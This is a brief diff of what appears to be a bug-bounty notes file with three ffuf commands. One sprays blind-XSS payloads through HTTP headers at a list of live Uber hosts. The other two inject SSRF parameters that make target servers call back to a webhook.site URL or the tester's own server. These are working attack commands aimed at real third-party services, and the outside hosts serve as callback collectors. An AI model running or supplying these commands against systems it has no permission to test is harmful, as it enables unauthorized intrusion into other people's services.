@@ -1,7 +1,11 @@
 
 
 ffuf -c -u FUZZ1 -H "FUZZ2: FUZZ3" -w alive_uber.txt:FUZZ1 -w headers.txt:FUZZ2 -w blind_xss.txt:FUZZ3 -x http://192.168.196.1:8082 -mode clusterbomb -v 
+
+
 ffuf -c -u HOST/?PROT=https://webhook.site/f4494fd5-bd02-4fd2-893d-22368ac954b8/HOST/PROT -w alive_uber.txt:HOST -w ssrf_params:PROT -x http://192.168.196.1:8082 -mode clusterbomb -r -v 
+
+
 ffuf -c -u HOST/?url=http://{my-server-ip}/DOMAIN/url&file=http://{my-server-ip}/DOMAIN/file -w hosts.txt:HOST -w domains.txt:DOMAIN -mode pitchfork -v 
 
 ####################################
